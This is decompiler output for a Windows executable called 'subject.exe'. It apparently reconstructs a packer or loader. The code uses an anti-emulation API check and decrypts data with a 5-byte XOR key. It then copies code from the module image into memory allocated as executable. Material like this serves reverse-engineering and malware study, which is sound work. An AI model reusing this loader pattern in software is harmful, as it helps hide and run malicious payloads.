// subject_CODE.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 13101000: void fn13101000(Stack ptr32 dwArg04, Stack (ptr32 byte) dwArg08, Stack word32 dwArg0C, Stack (ptr32 word32) dwArg10, Stack ui32 dwArg14, Stack (arr byte) dwArg18)
// Called from:
//      Win32CrtStartup
void fn13101000(ptr32 dwArg04, byte * dwArg08, word32 dwArg0C, word32 * dwArg10, ui32 dwArg14, byte dwArg18[])
{
	*dwArg10 = dwArg0C;
	word16 wLoc0C_77 = (word16) ((uint64) dwArg14 % 0x05);
	byte * dwArg04_79 = dwArg04 + dwArg14;
	while (true)
	{
		--dwArg0C;
		if (dwArg0C == 0x00)
			break;
		*dwArg08 = *dwArg04_79 ^ dwArg18[(int32) wLoc0C_77];
		++wLoc0C_77;
		if ((int32) wLoc0C_77 == 0x05)
			wLoc0C_77 = 0x00;
		++dwArg08;
		++dwArg04_79;
	}
}

// 131010A0: Register Eq_42 Win32CrtStartup()
Eq_42 Win32CrtStartup()
{
	ptr32 fp;
	Eq_44 tLoc0238;
	Eq_45 tLoc10;
	if (SafeArrayUnaccessData(null) == 0x80070057)
	{
		word32 ecx_42 = g_dw13102000;
		fn13101000(fp - 40, fp - 40, 0x04, &tLoc10, 0x00, fp - 0x0234);
		word32 ecx_70 = g_dw13102004;
		fn13101000(fp - 0x025C, fp - 600, 0x04, &tLoc10, 0x04, fp - 0x0234);
		ui32 ecx_100 = g_dw13102008;
		fn13101000(fp - 0x1C, fp - 20, 0x04, &tLoc10, 0x08, fp - 0x0234);
		Eq_96 eax_134 = GetModuleHandleA(null);
		word32 eax_142 = g_dw1310200C;
		fn13101000(fp - 0x28, fp - 28, 0x04, &tLoc10, 0x0C, fp - 0x0234);
		ui32 dwLoc0248_500 = g_dw13102010;
		fn13101000(fp - 600, fp - 0x0248, 0x04, &tLoc10, 0x10, fp - 0x0234);
		ui32 ecx_219 = ecx_100 * 0x08 + 0x0C;
		ui32 dwLoc0250_507 = 0x14;
		word32 * dwLoc24_508 = &g_dw13102014;
		Eq_139 eax_232 = VirtualAlloc(0x00, ecx_219 + ecx_70 + ecx_42, 0x3000, 0x40);
		byte * dwLoc0C_515 = eax_134 + eax_142 / 4 + ecx_219 / 4;
		ui32 dwLoc0264_517 = ecx_219;
		ui32 dwLoc08_518 = 0x00;
		Eq_158 dwLoc18_519 = 0x00;
		while (true)
		{
			if (dwLoc0264_517 == dwLoc0248_500)
			{
				++dwLoc08_518;
				if (dwLoc08_518 == ecx_100)
					;
				word32 edx_262 = *dwLoc24_508;
				fn13101000(fp - 28 - dwLoc0250_507, fp - 28, 0x04, &tLoc10, dwLoc0250_507, fp - 0x0234);
				ui32 * dwLoc24_537 = dwLoc24_508 + 1;
				ui32 dwLoc0250_536 = dwLoc0250_507 + 0x04;
				dwLoc0248_500 = *dwLoc24_537;
				fn13101000(fp - 0x0248 - dwLoc0250_536, fp - 0x0248, 0x04, &tLoc10, dwLoc0250_536, fp - 0x0234);
				dwLoc0250_507 = dwLoc0250_536 + 0x04;
				dwLoc24_508 = dwLoc24_537 + 1;
				dwLoc0264_517 = 0x00;
				dwLoc0C_515 = (byte *) (eax_134 + edx_262 / 4);
			}
			Mem349[eax_232 + dwLoc18_519:byte] = Mem344[dwLoc0C_515 + 0x00:byte];
			++dwLoc0C_515;
			++dwLoc18_519;
			++dwLoc0264_517;
		}
	}
	else
	{
		Eq_42 eax_443;
		(*(<anonymous> **) 0x28)();
		return eax_443;
	}
}

// subject_DATA.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

word32 g_dw13102000 = 563379892; // 13102000
word32 g_dw13102004 = 0x944694A0; // 13102004
ui32 g_dw13102008 = 0x46B43023; // 13102008
word32 g_dw1310200C = 0xB4300194; // 1310200C
ui32 g_dw13102010 = 807503344; // 13102010
word32 g_dw13102014 = 563439284; // 13102014
// subject_idata.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

word32 g_dw13110050 = 0x000100D0; // 13110050
word32 g_dw13110054 = 0x000100E0; // 13110054
word32 g_dw13110058 = 0x000100F0; // 13110058
word32 g_dw1311005C = 0x00010104; // 1311005C
word32 g_dw13110060 = 0x00010112; // 13110060
word32 g_dw13110064 = 0x0001011C; // 13110064
word32 g_dw1311006C = 0x0001013A; // 1311006C
word32 g_dw13110070 = 0x0001014E; // 13110070
word32 g_dw13110074 = 0x00010166; // 13110074
word32 g_dw13110078 = 0x0001017C; // 13110078
word32 g_dw13110080 = 65956; // 13110080
word32 g_dw13110084 = 65966; // 13110084
word32 g_dw13110088 = 0x000101B8; // 13110088
<anonymous> * __imp__LockResource = &g_t100D0; // 13110090
<anonymous> * __imp__FindResourceA = &g_t100E0; // 13110094
<anonymous> * __imp__GetModuleHandleA = &g_t100F0; // 13110098
<anonymous> * __imp__ExitProcess = &g_t10104; // 1311009C
<anonymous> * __imp__GetACP = &g_t10112; // 131100A0
<anonymous> * __imp__VirtualAlloc = &g_t1011C; // 131100A4
<anonymous> * __imp__CreateStdDispatch = &g_t1013A; // 131100AC
<anonymous> * __imp__SafeArrayUnaccessData = &g_t1014E; // 131100B0
<anonymous> * __imp__VarNumFromParseNum = &g_t10166; // 131100B4
<anonymous> * __imp__SafeArraySetRecordInfo = &g_t1017C; // 131100B8
<anonymous> * __imp___chdir = &g_t101A4; // 131100C0
<anonymous> * __imp___assert = &g_t101AE; // 131100C4
<anonymous> * __imp___access = &g_t101B8; // 131100C8
